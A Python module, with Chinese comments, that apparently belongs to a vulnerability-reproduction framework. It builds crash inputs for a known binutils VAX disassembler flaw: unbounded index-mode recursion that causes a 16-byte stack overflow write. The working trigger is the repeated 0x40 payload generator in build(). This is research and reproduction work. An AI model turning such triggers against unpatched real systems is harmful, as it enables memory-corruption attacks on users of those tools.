"""CG-26（arvo:19414 / binutils vax-dis）index mode 递归构造器。

**缺陷**：opcodes/vax-dis.c 的 print_insn_mode()：

    case 0x40: /* Index: base-addr[Rn] */
      p += print_insn_mode (d, size, p0 + 1, addr + 1, info);   /* 无递归深度限制 */
      ...
      break;

模式字节高半字节 0x4 表示 index 模式，每层递归只消耗 1 字节；重复足够多即可让
fetch_data() -> buffer_read_memory() 把 16 字节 memcpy 到 disassemble_info 的
private 缓冲（the_buffer）之外 —— 官方报 WRITE of size 16，栈上越界。

patch：(opcodes/ChangeLog) "vax-dis.c (print_insn_mode): Stop index mode recursion."

**fuzz 目标输入布局**（src-vul/fuzz_disassemble.c）：

    [ 指令字节 (Size-10 个) ][ flavour(1) ][ mach(8, LE) ][ arch(1) ]

- Size 必须 >= 10；buffer_length = Size-10；arch 要 bfd_lookup_arch 能认。
- VAX 的 bfd_arch 枚举值是 3（unknown=0, obscure=1, m68k=2, vax=3）。

所以本构造器输出 = 深度个 0x40 + 10 字节选项（flavour=0, mach=0, arch=3）。
"""
from __future__ import annotations

import struct

DEFAULT_DEPTH = 400          # index 模式字节个数
MIN_DEPTH = 20
MAX_DEPTH = 4096
BFD_ARCH_VAX = 3

FIELDS = {
    "depth": "int(20..4096), index 模式字节(0x40)的个数（默认 400）",
    "mode_byte": "int(0..255), 递归用的模式字节（默认 0x40，高半字节必须是 4）",
    "arch": "int, fuzz 目标最后 1 字节的 arch（默认 3 = bfd_arch_vax）",
    "mach": "int, 8 字节小端 mach（默认 0）",
    "flavour": "int(0..255), 倒数第 10 字节 flavour（默认 0）",
}

DECLARED_SINK = {
    "file": "opcodes/vax-dis.c",
    "line": 260,
    "symbol": "fetch_data",
    "note": "index 模式递归无深度限制，fetch_data 的 16 字节 memcpy 写穿 private.the_buffer",
}


class VaxModeResult:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "vax_mode"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> VaxModeResult:
    fields = dict(fields or {})
    try:
        depth = int(fields.get("depth", DEFAULT_DEPTH))
        mode = int(fields.get("mode_byte", 0x40))
        arch = int(fields.get("arch", BFD_ARCH_VAX))
        mach = int(fields.get("mach", 0))
        flavour = int(fields.get("flavour", 0))
    except (TypeError, ValueError):
        return VaxModeResult(False, reason="depth/mode_byte/arch/mach/flavour 必须是整数")
    if not MIN_DEPTH <= depth <= MAX_DEPTH:
        return VaxModeResult(False, reason="depth 越界（%d..%d）: %d" % (MIN_DEPTH, MAX_DEPTH, depth))
    if not 0 <= mode <= 0xFF or (mode & 0xF0) != 0x40:
        return VaxModeResult(False, reason="mode_byte 高半字节必须是 0x4（index 模式）: 0x%02x" % mode)
    if not 0 <= arch <= 0xFF:
        return VaxModeResult(False, reason="arch 越界（0..255）: %d" % arch)
    if not 0 <= mach <= 0xFFFFFFFFFFFFFFFF:
        return VaxModeResult(False, reason="mach 越界: %d" % mach)
    if not 0 <= flavour <= 0xFF:
        return VaxModeResult(False, reason="flavour 越界（0..255）: %d" % flavour)

    insn = bytes([mode]) * depth
    tail = bytes([flavour]) + struct.pack("<Q", mach) + bytes([arch])
    payload = insn + tail
    used = {"depth": depth, "mode_byte": "0x%02x" % mode, "arch": arch,
            "mach": mach, "flavour": flavour, "insn_bytes": len(insn),
            "bytes": len(payload)}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "vax_mode 构造器不识别该字段"}
               for k in fields if k not in known]
    return VaxModeResult(True, payload, used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：index 模式递归导致 fetch_data 的 16 字节 memcpy 写穿栈缓冲。"""
    return {
        "claim_id": "cg26-vax-index-mode",
        "subject": "print_insn_mode",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/vax_mode.py + arvo error.txt",
        "cwe": "CWE-121",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "vax_mode"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.size == 400 + 10
    assert r.data[:400] == b"\x40" * 400
    assert r.data[-1] == BFD_ARCH_VAX
    assert r.data[-10] == 0
    assert not build({"depth": 5}).ok
    assert not build({"mode_byte": 0x50}).ok
    assert not build({"arch": 999}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "print_insn_mode" and c["sink"]["line"] == 260
    print("vax_mode builder self-check OK:", r.to_record())
